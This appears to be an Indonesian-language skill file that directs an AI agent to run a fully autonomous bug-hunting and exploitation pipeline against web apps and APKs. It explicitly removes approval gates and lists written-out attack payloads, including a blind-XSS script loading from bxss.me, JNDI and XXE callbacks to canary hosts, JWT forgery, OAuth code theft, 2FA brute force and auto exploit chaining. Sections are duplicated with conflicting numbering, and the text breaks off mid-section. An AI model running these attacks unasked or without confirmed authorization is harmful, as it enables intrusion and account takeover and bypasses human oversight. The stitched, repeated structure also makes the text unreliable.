---
name: bug-hunter
description: Autonomous Bug Hunter & Vulnerability Assessor for Web & Android APK — ELITE EDITION. Covers WAF detection/bypass, subdomain brute-force, tech fingerprint, JS secret scan, JWT crack/forge, parameter fuzzing, GraphQL abuse, WebSocket probe, CVE matching, OAuth2/OIDC abuse, 2FA bypass, business logic testing, API versioning abuse, blind vulnerability detection (SQLi/SSRF/XSS via DNS canary), mobile deep link hijack, cache poisoning, subdomain takeover detection, full exploit chaining with auto severity escalation, chaos/monkey testing with verified cleanup, Playwright live watch mode with diff engine, multi-platform bug bounty templates (HackerOne/Bugcrowd/generic), and ONE consolidated Word (.docx) report with PoC, CVSS, kill chain narrative. Trigger: "hunt [url|apk]", "hunt web [url]", "hunt apk [path|pkg]", "hunt --watch [interval] [url]", "bughunt <target>".
---

# AUTONOMOUS BUG HUNTER (`bug-hunter`) — ELITE EDITION

Skill ini mengubah satu perintah menjadi operasi bug hunting level elite yang berjalan sendiri. User hanya memberi target; agent melakukan selebihnya: WAF bypass, JWT crack, OAuth abuse, 2FA bypass, business logic, blind vuln, cache poisoning, subdomain takeover, exploit chaining, chaos, cleanup, live diff dashboard, dan satu laporan Word terpadu.

---

## 0. ALUR OTONOM (VIBE BUG HUNTING LOOP — ELITE)

```
resolve → waf-detect → surface-expand → subdomain-takeover
        → recon → jwt-analyze → oauth-probe → 2fa-bypass
        → param-fuzz → api-version → graphql-probe → websocket-probe
        → assess → blind-detect → business-logic → cache-poison
        → cve-match → exploit-chain → chaos → cleanup
        → verify-cleanup → triage → report → [watch-diff?] → stop
```

Semua fase berjalan otomatis tanpa gate. Tidak ada `exploit ok`. Auto-stop hanya jika target produksi live dengan risiko perubahan data permanen tak ter-rollback.

---

## 1. FASE DETAIL

### §0 — Resolve
- Deteksi tipe target (Web / APK / hybrid) dari argumen atau dokumen workspace.
- Cek scope: domain in-scope, wildcard subdomain, out-of-scope list dari dokumen program bug bounty.
- Load kredensial dari `.env.qa` atau `qa-credentials.local.json` — tidak pernah diminta di chat.
- Tentukan profil laporan: `bughunt`, `bughunt-apk`, atau `bughunt-all`.

### §1 — WAF Detection & Bypass Strategy

**Deteksi:**
- Fingerprint dari response header: `cf-ray` (Cloudflare), `x-sucuri-id` (Sucuri), `x-akamai-*` (Akamai), `x-waf-event-info` (Imperva/Incapsula), `server: awselb` (AWS WAF).
- Kirim benign probe dulu, lalu payload ringan — bandingkan status code dan response body.
- Jika 403/406/429 muncul pada payload biasa → WAF aktif.

**Bypass strategy (urutan otomatis):**
1. **Header spoofing**: `X-Originating-IP: 127.0.0.1`, `X-Forwarded-For: 127.0.0.1`, `X-Remote-Addr: 127.0.0.1`.
2. **Encoding variation**: URL encode (`%27`), double encode (`%2527`), unicode (`\u0027`), hex (`\x27`).
3. **Case mutation**: `SeLeCt`, `uNiOn`, `ScRiPt`.
4. **Chunked transfer encoding** untuk bypass body inspection.
5. **Whitespace injection**: `un/**/ion`, `sel%0aect`.
6. Catat WAF type, bypass yang berhasil, dan bypass yang gagal — semua masuk triage.

### §2 — Surface Expand & Subdomain Takeover

**Subdomain Enumeration — multi-source:**
- `crt.sh`, `dns.bufferover.run`, `hackertarget.com`, `alienvault OTX`, `urlscan.io`.
- Jika `SHODAN_API_KEY` / `SECURITYTRAILS_KEY` ada di `.env.qa`: gunakan API tersebut.

**Subdomain Brute-Force (wordlist built-in):**
```
www, api, admin, app, dev, staging, test, beta, portal, dashboard,
mail, ftp, vpn, cdn, static, assets, media, upload, download,
auth, login, oauth, sso, internal, intranet, corp, cloud, s3,
ws, websocket, graphql, gql, grpc, monitor, status, health
```

**Subdomain Takeover Detection:**
Setelah subdomain ditemukan, cek apakah ada yang rentan takeover:
- Resolve CNAME tiap subdomain → cek apakah pointing ke layanan yang sudah dihapus.
- Layanan yang dicek: `GitHub Pages` (cname ke `*.github.io` tapi repo tidak ada), `Heroku` (cname ke `*.herokudns.com` tapi app tidak ada), `AWS S3` (bucket tidak ada), `Azure` (`.azurewebsites.net` tidak terdaftar), `Netlify`, `Vercel`, `Shopify`, `Fastly`.
- Jika respons menunjukkan "No Such Bucket", "There isn't a GitHub Pages site here", atau "No such app" → **SUBDOMAIN TAKEOVER CONFIRMED** → severity HIGH/CRITICAL.
- Eksploit takeover: buat resource di layanan tersebut, verifikasi kontrol subdomain.

**Technology Fingerprinting (Wappalyzer-style):**
- Server, framework, CDN, WAF dari header + HTML pattern + JS framework detection.

**Port Probe Ringan:** 80, 443, 8080, 8443, 3000, 3001, 4000, 4443, 5000, 8000, 8888, 9000, 9090.

**Robots.txt, Sitemap, JS File Analysis:** endpoint tersembunyi + secret hunting (AWS key, token, Firebase, S3).

### §3 — Recon
- Audit header keamanan, CORS, cookie flags, TLS version, error disclosure.
- APK: manifest audit, exported components, cleartext traffic, SSL pinning.
- Output → `pendukung/reconnaissance/`.

### §4 — JWT Analysis

1. **Decode** header + payload → tampilkan claims lengkap.
2. **Algorithm check**: `alg: none` → kirim tanpa signature; `HS256` → brute-force secret (256+ kata umum); `RS256` → confusion attack (ganti ke HS256, sign dengan public key).
3. **Claim tampering**: ubah `role: user` → `role: admin`, ubah `sub`, extend `exp`.
4. **kid injection**: SQL injection di `kid` claim, path traversal.
5. **jku/x5u hijacking**: ganti URL key ke endpoint milik sendiri.

### §5 — OAuth 2.0 / OIDC Abuse

Deteksi OAuth: cari `/oauth/authorize`, `/oauth/token`, `/.well-known/openid-configuration`.

**Probe yang dijalankan otomatis:**
1. **State parameter CSRF**: kirim request tanpa `state` atau dengan `state` tetap → jika login berhasil = CSRF pada OAuth.
2. **Redirect URI bypass**:
   - `redirect_uri=https://target.com.evil.com/`
   - `redirect_uri=https://target.com/callback/../../../evil`
   - `redirect_uri=https://target.com/callback%40evil.com`
   - Jika authorization code/token diarahkan ke domain lain = CRITICAL.
3. **Implicit flow token leak**: cek apakah `access_token` muncul di URL fragment yang bisa diakses via `Referer` header.
4. **Token leakage via Referer**: cek apakah halaman post-login include token di URL yang kemudian ter-leak di Referer ke third-party resource.
5. **PKCE bypass**: coba exchange code tanpa `code_verifier` pada flow yang seharusnya pakai PKCE.
6. **Open redirect chaining**: gabungkan open redirect di target dengan OAuth → steal authorization code.
7. **Account linking abuse**: coba link akun OAuth dari provider lain ke akun yang sudah ada (pre-account takeover).
8. **scope escalation**: minta scope lebih dari yang diizinkan (`scope=admin offline_access`).

### §6 — 2FA / OTP Bypass

Deteksi 2FA: cari form OTP, TOTP input, SMS verification step.

**Probe yang dijalankan otomatis:**
1. **Response manipulation**: intercept response "2FA required" → ubah `"mfa_required": true` → `false` via Playwright response override.
2. **Rate limit absent**: kirim 100 OTP berbeda secara cepat → jika tidak di-block = brute-force possible.
3. **Code reuse**: pakai OTP yang sama dua kali → jika diterima = no invalidation after use.
4. **Code length brute**: coba semua kombinasi 4-digit (0000–9999) atau 6-digit bila rate limit tidak ada.
5. **Backup code leak**: probe `/api/user/backup-codes`, `/account/recovery` tanpa auth.
6. **Skip step**: langsung akses URL post-2FA tanpa menyelesaikan 2FA flow → jika berhasil = bypass.
7. **Null/empty OTP**: kirim `otp: null`, `otp: ""`, `otp: 000000` → jika diterima = validation absent.

### §7 — Parameter Discovery & Fuzzing

**Hidden parameter discovery** via wordlist: `debug, test, admin, internal, dev, verbose, trace, log, dump, export, format, type, action, callback, redirect, url, next, return, goto, target, id, user_id, account_id, order_id, file, path, page, limit, token, key, secret, api_key, auth, session, csrf`.

**Value fuzzing per tipe**: integer overflow, string null/undefined/array, UUID confusion, path traversal.

**Mass assignment probe**: `is_admin: true`, `role: admin`, `verified: true`, `price: 0`, `discount: 100`.

### §8 — API Versioning Abuse

**Probe otomatis:**
1. Jika target pakai `/api/v2/endpoint`, coba juga `/api/v1/endpoint`, `/api/v0/endpoint`, `/api/endpoint`.
2. Versi lama sering lebih permisif: tidak ada auth check, tidak ada rate limit, response lebih verbose.
3. Coba juga header versioning: `Accept: application/vnd.api+json;version=1`, `API-Version: 1`.
4. Cari deprecated endpoint di JS file / dokumentasi publik / `robots.txt`.
5. Jika versi lama return data lebih banyak atau tanpa auth → severity HIGH, dokumentasikan perbedaan response.

### §9 — GraphQL Probe

Deteksi: `/graphql`, `/api/graphql`, `/gql`, `/query`, `/v1/graphql`.

1. **Introspection**: `{__schema{types{name fields{name}}}}` → map schema.
2. **Field suggestion abuse**: kirim field salah eja → enumerate schema tanpa introspection.
3. **Batch query abuse**: 100 query sekaligus → cek rate limit.
4. **Mutation probe**: cari mutation tanpa autentikasi.
5. **Deep nesting DoS**: query bersarang 10+ level.
6. **IDOR via GraphQL**: query object milik user lain via ID.
7. **Injeksi di argument**: `{user(id: "1 OR 1=1"){email}}`.

### §10 — WebSocket Probe

Deteksi: `Upgrade: websocket` header, `new WebSocket(` di JS, `socket.io`, `sockjs`.

1. Connect via Playwright, probe auth bypass, message injection, subscription abuse, origin check, reconnect flood.

### §11 — Assess (Full Vulnerability Assessment)

*Web:* Missing headers, CORS, IDOR, unauth endpoint, XSS, SQLi, open redirect, path traversal, SSRF, SSTI, XXE, prototype pollution, HTTP request smuggling.

*APK:* Storage privat, cleartext traffic, SSL pinning, exported component, clipboard exposure, `FLAG_SECURE`.

### §12 — Blind Vulnerability Detection

Teknik khusus untuk kerentanan yang tidak langsung terlihat dari response:

**Blind SQLi (Time-Based):**
- Inject `'; WAITFOR DELAY '0:0:5'--` (SQL Server), `'; SELECT SLEEP(5)--` (MySQL), `'; SELECT pg_sleep(5)--` (PostgreSQL).
- Jika response time meningkat 5 detik → Blind SQLi confirmed.
- Otomatis enumerate: DB version, jumlah kolom, nama tabel pertama.

**Blind SSRF (via DNS Canary):**
- Gunakan domain canary yang dikontrol agent: format `{target_hash}.bxss.me` atau `{unique_id}.oastify.com` (jika tersedia via `.env.qa`).
- Inject ke semua parameter yang menerima URL: `url=`, `redirect=`, `webhook=`, `avatar=`, `import=`, `fetch=`.
- Juga inject ke header: `X-Forwarded-For`, `X-Original-URL`, `Referer`, `Host`.
- Jika DNS lookup terjadi ke canary domain → Blind SSRF confirmed → severity HIGH/CRITICAL.

**Blind XSS (via Canary Payload):**
- Inject payload yang report balik ke endpoint: `<script src="https://bxss.me/t/probe.js?uid={id}"></script>`.
- Target field: comment, feedback, nama profil, subject tiket support — field yang mungkin di-render oleh admin/moderator.
- Jika callback diterima → Stored Blind XSS confirmed → severity HIGH/CRITICAL.

**Out-of-Band XXE:**
- `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]>` → embed di XML request.
- Jika callback ke canary → XXE confirmed dengan OOB exfiltration potential.

### §13 — Business Logic Testing

**Probe yang dijalankan otomatis:**
1. **Negative price / zero price**: kirim `price: -1`, `price: 0`, `amount: -100` pada endpoint transaksi.
2. **Coupon stacking**: apply kupon yang sama berkali-kali dalam satu order.
3. **Race condition pada limit**: parallel request ke endpoint yang harusnya 1x (klaim reward, referral bonus, vote).
4. **Privilege escalation via parameter**: ubah `user_id` ke ID lain pada endpoint edit profil/akun.
5. **Workflow bypass**: skip step checkout (langsung ke `/order/confirm` tanpa `/order/payment`).
6. **Quantity manipulation**: order 0 item, order -1 item, order 999999 item.
7. **Free item via refund abuse**: probe apakah refund bisa dilakukan sebelum item dikirim.
8. **Role boundary**: pakai akun user biasa, coba endpoint admin dengan semua method.

### §14 — Cache Poisoning

**Web Cache Poisoning:**
1. Tambahkan unkeyed header ke request dan amati apakah masuk ke response yang di-cache:
   - `X-Forwarded-Host: evil.com` → jika response berisi `evil.com` = Host header injection + cache poisoning potential.
   - `X-Forwarded-Scheme: http` → downgrade HTTPS ke HTTP dalam response.
   - `X-Original-URL: /admin` → path override.
2. Konfirmasi cache: kirim request kedua tanpa header tersebut → jika response masih berisi nilai evil = cache poisoned.
3. Severity: MEDIUM jika lokal, HIGH/CRITICAL jika bisa poisoning global CDN cache.

**Web Cache Deception:**
1. Probe `/account/profile/nonexistent.css`, `/dashboard/settings.jpg` — tambah ekstensi statis ke URL privat.
2. Jika server melayani halaman autentikasi dengan ekstensi statis → cache menyimpan halaman privat → pengguna lain bisa akses via URL yang sama.

### §15 — CVE Matching dari Tech Fingerprint

Lookup via NIST NVD API: `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech}+{version}&cvssV3Severity=HIGH`

Mapping otomatis: Nginx, WordPress, jQuery, OpenSSL, Apache Struts, Log4j, Spring Boot, Rails, Laravel, Django.

### §16 — Exploit Chain (Full Auto)

| Chain | Trigger | Eksekusi |
|---|---|---|
| Account Takeover | IDOR + weak/no auth | Enumerate ID → access victim resource → verify data |
| Auth Bypass | Unauth endpoint | Direct access admin endpoint → extract response |
| SQLi Extraction | SQLi confirmed | Enum columns → extract DB version, tables, sample data |
| Blind SQLi | Time-based confirmed | Enumerate table names char by char |
| SSRF Pivot | SSRF confirmed | Probe internal services → map internal network |
| JWT Takeover | JWT vuln confirmed | Forge admin token → access privileged resource |
| OAuth Code Steal | Redirect URI bypass | Redirect auth code to controlled endpoint |
| 2FA Skip | Bypass confirmed | Access post-2FA resource without completing flow |
| GraphQL Enum | Introspection + IDOR | List all user IDs → extract emails/data |
| XSS Session Hijack | Reflected XSS | Inject payload → capture cookie ke canary |
| Race Condition Win | Race endpoint | 10 parallel requests → verify inconsistent state |
| Prototype Pollution | PP confirmed | Escalate `__proto__.admin=true` → test privilege |
| Log4Shell | Log4j detected | Inject JNDI string → verify callback (canary) |
| Subdomain Takeover | Dangling CNAME | Claim subdomain via target service |
| Cache Poisoning | Unkeyed header | Poison cache → serve malicious content |
| Business Logic | Logic flaw confirmed | Negative price / race condition → extract value |

**Auto-escalate severity** jika chain berhasil: IDOR (MEDIUM) + admin access → HIGH; XSS + hijack → CRITICAL; SSRF + internal pivot → CRITICAL.

### §17 — Chaos / Monkey Testing

*Web:* Input fuzzing (10k+, unicode, null byte, format string, prototype pollution), HTTP method mangling, race condition 10 parallel, error disclosure, large file upload.

*APK:* `adb shell monkey -p <pkg> --throttle 100 -v 1000`, intent injection, low-memory kill, permission revoke mid-session.

### §18 — Cleanup (Auto)

| Jejak | Metode |
|---|---|
| Browser cookies & session | `browser_clear_cookies`, logout endpoint |
| Local storage / IndexedDB | `localStorage.clear(); sessionStorage.clear()` via Playwright |
| Data uji via API | Endpoint delete/rollback dengan ID yang dicatat selama exploit |
| File temporer device | `adb shell rm -rf` |
| Log buffer device | `adb logcat -c` |
| Proxy config emulator | `adb shell settings put global http_proxy :0` |
| Data tidak bisa dihapus | Catat untuk vendor → cleanup status = `PARTIAL` |

### §19 — Verify-Cleanup
- Status: `VERIFIED` atau `PARTIAL`.

### §20 — Triage
- Tulis semua ke `pendukung/ai/triage.json`: findings, kill chains, CVE matches, WAF status, JWT analysis, OAuth results, 2FA bypass results, subdomain takeover, cache poisoning, blind vuln, business logic.

### §21 — Report
- DOCX: `build_report.py --profile bughunt`.
- Multi-format: `submission-hackerone.md`, `submission-bugcrowd.md`, `submission-generic.md`.
- Watch dashboard: `watch-dashboard.html`.

### §22 — Watch Mode (Playwright Live Dashboard)

Aktif jika perintah menyertakan `--watch [interval_menit]`:
1. Playwright buka browser **visible (non-headless)**.
2. Navigasi ke `watch-dashboard.html` lokal.
3. Setiap N menit: jalankan ulang recon + assess (tanpa chaos ulang).
4. **Diff engine**: compare `triage.json` vs `triage-prev.json` → highlight temuan baru/changed/resolved.
5. Auto-refresh 10 detik. Stop: `stop hunt` di chat.

---

## 2. CARA MEMERINTAHKAN

| Perintah | Eksekusi |
|---|---|
| `hunt [url]` | Web hunting penuh semua fase. |
| `hunt web [url]` | Eksplisit web. |
| `hunt apk [path\|pkg]` | APK hunting penuh. |
| `hunt all [url] [apk]` | Hybrid web + APK, satu triage satu DOCX. |
| `hunt --watch 30 [url]` | Watch mode: hunt penuh → ulang tiap 30 menit → live diff dashboard. |

Alias: `bughunt [target]`, `bug hunter web <url>`, `bug hunter apk <file>`.

---

## 3. GUARDRAIL & ZERO REDACTION POLICY

1. **Otorisasi**: Jalankan hanya pada target milik sendiri, staging/UAT, atau program bug bounty dengan scope tertulis.
2. **Stop Produksi**: Eksploit yang akan mengubah data produksi permanen tanpa rollback → hentikan chain, tandai `BLOCKED`.
3. **Zero Redaction**: Nilai aktual dari artefak tampil apa adanya. Nilai tidak ada = `(...)`. Tidak ada `[REDACTED]`.
4. **Kredensial**: Tidak pernah diminta di chat. Tidak pernah ditulis ke log publik.
5. **iOS/IPA**: Belum didukung. Tandai `BLOCKED`. Tambah saat ada `xcrun simctl`.
6. **DoS dilarang**: Chaos testing dibatasi request count yang wajar; bukan flood/DDoS.

---

## 4. FORMAT TRIAGE.JSON STANDAR

```json
{
  "target": "https://target.com",
  "mode": "bughunt-web",
  "date": "2026-11-20",
  "environment": "Bug Bounty / Staging",
  "verdict": "CRITICAL FINDINGS — DO NOT RELEASE",
  "ticket_ref": "HackerOne / nama program",
  "report": {
    "profile": "bughunt",
    "output": "Laporan-BugHunter-target-20261120.docx",
    "page_breaks_before": ["kill_chains", "findings", "risk", "appendix_cases"]
  },
  "waf": {
    "detected": true, "type": "Cloudflare",
    "bypass_success": ["X-Forwarded-For: 127.0.0.1"],
    "bypass_failed": ["case mutation"]
  },
  "recon": {
    "subdomains_found": [
      {"host": "api.target.com", "ip": "1.2.3.4", "status": 200, "tech": "Node.js", "takeover": false},
      {"host": "old.target.com", "ip": null, "cname": "target.github.io", "status": 404, "takeover": true}
    ],
    "tech_stack": ["Nginx/1.18", "React", "Node.js/18"],
    "endpoints": [{"method": "GET", "url": "/api/v1/users", "auth": "None", "status": 200}],
    "secrets_detected": [{"type": "AWS Key", "location": "main.js:L1842", "value": "AKIA...", "risk": "CRITICAL"}]
  },
  "jwt_analysis": [],
  "oauth_analysis": [
    {
      "id": "OAUTH-01", "flow": "Authorization Code",
      "vulnerability": "redirect_uri bypass — code redirected to evil.com",
      "severity": "CRITICAL",
      "exploit": "Authorization code stolen, exchanged for access token"
    }
  ],
  "twofa_analysis": [
    {
      "id": "2FA-01", "method": "TOTP",
      "vulnerability": "Rate limit absent — 10000 OTP attempts allowed",
      "severity": "HIGH",
      "exploit": "Brute-forced 6-digit OTP in 30 minutes"
    }
  ],
  "blind_findings": [
    {
      "id": "BLIND-01", "type": "Blind SSRF",
      "location": "POST /api/webhook?url=",
      "canary_hit": "abc123.bxss.me DNS callback received",
      "severity": "HIGH"
    }
  ],
  "business_logic": [
    {
      "id": "BL-01", "type": "Race Condition",
      "location": "POST /api/coupon/apply",
      "finding": "Coupon applied 7 times simultaneously via race condition",
      "severity": "HIGH"
    }
  ],
  "cache_poisoning": [
    {
      "id": "CP-01", "type": "Web Cache Poisoning",
      "header": "X-Forwarded-Host: evil.com",
      "confirmed": true,
      "severity": "HIGH"
    }
  ],
  "subdomain_takeover": [
    {
      "id": "TAKE-01", "subdomain": "old.target.com",
      "cname": "target.github.io", "service": "GitHub Pages",
      "confirmed": false, "severity": "HIGH",
      "note": "Repo tidak ada — klaim dengan membuat repo GitHub Pages"
    }
  ],
  "cve_matches": [],
  "kill_chains": [],
  "chaos": {"cleanup_status": "VERIFIED", "tests": [], "cleanup_items": []},
  "findings": [],
  "passed_checks": [],
  "limitations": [],
  "summary": {
    "total_findings": 0,
    "by_severity": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0},
    "verdict": "PENDING"
  }
}
```

---

## 5. STRUKTUR ARTEFAK

```
hasil-hunt-[target]-[tanggal]/
├── Laporan-BugHunter-[Target]-[Tanggal].docx
├── submission-hackerone.md
├── submission-bugcrowd.md
├── submission-generic.md
├── watch-dashboard.html
└── pendukung/
    ├── ai/
    │   ├── triage.json
    │   ├── triage-prev.json          ← Watch diff snapshot
    │   ├── audit-log.jsonl
    │   └── generated-cases.md
    ├── bukti/
    │   ├── network/
    │   ├── jwt/
    │   ├── oauth/                    ← OAuth flow captures
    │   ├── blind/                    ← Canary callback logs
    │   └── screenshots/
    └── reconnaissance/
        ├── subdomains.json
        ├── subdomain-takeover.json   ← Takeover candidates
        ├── tech-fingerprint.json
        ├── endpoints.json
        ├── js-secrets.json
        ├── cve-matches.json
        ├── graphql-schema.json
        ├── waf-analysis.json
        ├── cache-poisoning.json      ← Cache probe results
        └── api-versions.json         ← Deprecated API endpoints
```

---

## 6. PERINTAH LENGKAP

```bash
hunt web https://target.com/
hunt apk com.target.app
hunt all https://target.com/ com.target.app
hunt --watch 30 https://target.com/
bughunt https://target.com/
```

Generator laporan:
```bash
python C:\Users\Harrys\.config\opencode\skills\bug-hunter\build_report.py --root <folder_hasil>
```

### §2 — Surface Expand (Attack Surface Discovery)

**Subdomain Enumeration — multi-source:**
- `crt.sh`: `https://crt.sh/?q=%25.{domain}&output=json`
- `dns.bufferover.run`: `https://dns.bufferover.run/dns?q=.{domain}`
- `hackertarget.com`: `https://api.hackertarget.com/hostsearch/?q={domain}`
- `alienvault OTX`: `https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns`
- `urlscan.io`: `https://urlscan.io/api/v1/search/?q=domain:{domain}&size=100`
- Jika `SHODAN_API_KEY` ada di `.env.qa`: Shodan host search.
- Jika `SECURITYTRAILS_KEY` ada: SecurityTrails subdomain API.

**Subdomain Brute-Force (wordlist built-in):**
Probe HTTP/HTTPS ke subdomain umum bila enumeration passive kurang:
```
www, api, admin, app, dev, staging, test, beta, portal, dashboard,
mail, ftp, vpn, cdn, static, assets, media, upload, download,
auth, login, oauth, sso, internal, intranet, corp, cloud, s3,
ws, websocket, graphql, gql, grpc, monitor, status, health
```
Paralel async fetch — catat yang resolve dan return 200/301/302/403.

**Technology Fingerprinting (Wappalyzer-style):**
- Server header: `nginx`, `apache`, `iis`, `caddy`, `gunicorn`, `uvicorn`.
- Framework: `X-Powered-By`, HTML meta generator, cookie name pattern (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `laravel_session`, `_rails`).
- CDN: `CF-Ray` (Cloudflare), `x-amz-cf-id` (CloudFront), `x-cache` (Varnish/Fastly).
- JS framework: detect dari `window.__NEXT_DATA__` (Next.js), `window.angular` (Angular), `window.React`, `__vue__`.
- CMS: WordPress (`/wp-login.php`), Drupal (`/sites/default/`), Joomla (`/administrator/`).

**Port Probe Ringan:**
Probe HTTP/HTTPS ke port: `80, 443, 8080, 8443, 3000, 3001, 4000, 4443, 5000, 8000, 8888, 9000, 9090`.

**Robots.txt & Sitemap**: parse dan expand endpoint list.

**JS File Analysis:**
- Unduh seluruh `.js` file yang direferensikan dari halaman utama.
- Scan dengan regex untuk:
  * API endpoint tersembunyi: `/api/v[0-9]/`, `fetch\(['"](.+?)['"]\)`, `axios\.get\(['"](.+?)['"]\)`
  * Hardcoded secret: `(?:api[_-]?key|token|secret|password|passwd|pwd)\s*[:=]\s*['"][^'"]{8,}['"]`
  * AWS key: `AKIA[0-9A-Z]{16}`
  * Private IP: `(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)`
  * Firebase URL: `\.firebaseio\.com`
  * S3 bucket: `s3\.amazonaws\.com/[^'"]+`

### §3 — Recon

**Web:**
- Audit header keamanan: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COEP, COOP.
- CORS: wildcard `*`, reflect origin tanpa validation, `null` origin accepted.
- Cookie flags: Secure, HttpOnly, SameSite.
- TLS: versi (TLS 1.0/1.1 = vuln), sertifikat expired/self-signed.
- Error disclosure: stack trace di 500, versi DB di error message.

**APK:**
- Flag `debuggable`, `allowBackup`, exported components tanpa `permission` guard.
- `usesCleartextTraffic`, `networkSecurityConfig`.

Output → `pendukung/reconnaissance/` sebagai JSON terstruktur.

### §4 — JWT Analysis

Jalankan pada setiap JWT yang ditemukan (Authorization header, cookie, response body):

1. **Decode**: split `.` → base64url decode header + payload → tampilkan claim lengkap.
2. **Algorithm check**:
   - `alg: none` → coba kirim token tanpa signature → jika diterima = CRITICAL.
   - `alg: HS256` → coba brute-force secret dengan wordlist: `secret`, `password`, `123456`, `jwt_secret`, nama domain, nama app, `changeme`, `supersecret`, `private_key` (256+ kata umum).
   - `alg: RS256` → coba confusion attack: ganti `RS256` → `HS256`, sign dengan public key sebagai HMAC secret.
3. **Claim tampering**:
   - Ubah `role: user` → `role: admin`.
   - Ubah `sub` ke ID lain.
   - Set `exp` ke masa depan jauh.
   - Kirim token yang sudah dimodifikasi — jika diterima = HIGH/CRITICAL.
4. **kid injection**: jika ada `kid` claim → coba SQL injection di kid (`' UNION SELECT 'secret'--`) atau path traversal (`../../dev/null`).
5. **jku/x5u hijacking**: jika ada URL-based key → coba ganti ke endpoint milik sendiri.

Semua hasil JWT analysis masuk findings dengan ID `JWT-01`, `JWT-02`, dst.

### §5 — Parameter Discovery & Fuzzing

**Hidden parameter discovery:**
Probe endpoint yang ditemukan dengan parameter tambahan:
```
debug, test, admin, internal, dev, beta, preview, staging,
verbose, trace, log, dump, export, format, type, action,
callback, redirect, url, next, return, goto, target,
id, user_id, account_id, order_id, file, path, page, limit,
token, key, secret, api_key, auth, session, csrf
```
Metode: tambahkan ke query string satu per satu, amati perubahan response (panjang, status, konten).

**Value fuzzing per tipe:**
- Integer field: `-1`, `0`, `9999999`, `2147483647`, `2147483648` (overflow).
- String field: `null`, `undefined`, `true`, `false`, `[]`, `{}`, `""`, `" "`.
- ID field: UUID random, negative, string, array.
- File path: `../`, `../../etc/passwd`, `%2e%2e%2f`, `..%252f`.

**Mass assignment probe:**
Tambahkan field tak terduga ke request body: `is_admin: true`, `role: admin`, `verified: true`, `price: 0`, `discount: 100`.

### §6 — GraphQL Probe

Deteksi GraphQL: cek `/graphql`, `/api/graphql`, `/gql`, `/query`, `/v1/graphql`.

**Jika ditemukan:**
1. **Introspection query**: `{__schema{types{name fields{name}}}}` → map seluruh schema.
2. **Field suggestion abuse**: kirim field salah eja → server mungkin suggest nama field valid → enumerate schema tanpa introspection.
3. **Batch query abuse**: kirim 100 query sekaligus dalam satu request → cek rate limiting.
4. **Mutation probe**: cari mutation yang bisa ubah data tanpa autentikasi.
5. **Deep nesting DoS**: query bersarang 10+ level → amati response time.
6. **IDOR via GraphQL**: query object milik user lain via ID.
7. **Injeksi di argument**: `{user(id: "1 OR 1=1"){email}}`.

### §7 — WebSocket Probe

Deteksi WebSocket: cek `Upgrade: websocket` header pada response, scan JS untuk `new WebSocket(`, `socket.io`, `sockjs`.

**Jika ditemukan:**
1. Connect via Playwright: `page.evaluate(() => new WebSocket('wss://target.com/ws'))`.
2. **Auth bypass**: connect tanpa token → amati apakah server merespons atau disconnect.
3. **Message injection**: kirim payload JSON dengan field tak terduga, SQL injection, XSS payload.
4. **Subscription abuse**: subscribe ke channel milik user lain via ID manipulasi.
5. **Origin check**: connect dengan `Origin: https://evil.com` → jika diterima = MEDIUM (CORS over WebSocket).
6. **Reconnect flood**: kirim connect/disconnect cepat → amati rate limiting.

### §8 — Assess (Vulnerability Assessment Lengkap)

*Web:*
- Missing/misconfigured security headers.
- CORS misconfiguration.
- IDOR sistematis.
- Unauthenticated endpoint.
- Reflected XSS non-destructive.
- SQLi detection (error-based + time-based blind).
- Open redirect.
- Path traversal.
- SSRF probe ke `169.254.169.254`, `metadata.google.internal`, `169.254.170.2` (ECS).
- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- XXE: embed `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`.
- Prototype pollution: `__proto__[admin]=true` di JSON body.
- HTTP Request Smuggling: `Content-Length` + `Transfer-Encoding` desync probe.

*APK:*
- Storage privat: plaintext di shared_prefs, SQLite, external storage.
- HTTP cleartext traffic.
- SSL pinning check.
- Exported component intent injection.
- Clipboard exposure.
- `FLAG_SECURE` pada layar sensitif.

### §9 — CVE Matching dari Tech Fingerprint

Setelah tech stack teridentifikasi, lakukan lookup CVE via public API:

```
https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech}+{version}&cvssV3Severity=HIGH
```

Contoh mapping otomatis:
- `Nginx 1.18.0` → lookup `nginx 1.18` → list CVE dengan CVSS ≥ 7.0.
- `WordPress 6.2` → lookup `wordpress 6.2` → known CVE.
- `jQuery 1.x` → XSS via DOM (CVE-2019-11358).
- `OpenSSL 1.0.x` → Heartbleed probe (`heartbleed`).
- `Apache Struts` → lookup CVE-2017-5638 (EternalBlue-like RCE).
- `Log4j / log4shell` → inject `${jndi:ldap://canary.burp}` ke header User-Agent, Referer, X-Api-Version.

Hasil: tabel CVE per komponen dengan link NIST, CVSS skor, dan apakah target kemungkinan rentan.

### §10 — Exploit Chain (Full Auto)

| Chain | Trigger Otomatis | Eksekusi |
|---|---|---|
| Account Takeover | IDOR + weak/no auth | Enumerate ID → access victim resource → verify data |
| Auth Bypass | Unauth endpoint | Direct access admin endpoint → extract response |
| SQLi Extraction | SQLi confirmed | Enum columns → extract DB version, tables, sample data |
| SSRF Internal Pivot | SSRF confirmed | Probe internal services → map internal network |
| JWT Takeover | JWT vuln confirmed | Forge admin token → access privileged resource |
| GraphQL Account Enum | Introspection + IDOR | List all user IDs → extract emails/data |
| XSS Session Hijack | Reflected XSS | Inject payload → capture cookie ke logger milik sendiri |
| Race Condition Win | Race condition endpoint | 10 parallel requests → verify inconsistent state |
| Prototype Pollution | PP confirmed | Escalate `__proto__.admin=true` → test privilege |
| Log4Shell | Log4j detected | Inject JNDI string → verify callback (canary domain) |

Severity temuan individual **auto-escalate** jika chain berhasil:
- IDOR (MEDIUM) + berhasil akses data admin → upgrade ke HIGH.
- XSS (MEDIUM) + session hijack berhasil → upgrade ke HIGH/CRITICAL.
- SSRF (HIGH) + internal network terekspos → upgrade ke CRITICAL.

### §11 — Chaos / Monkey Testing

*Web:*
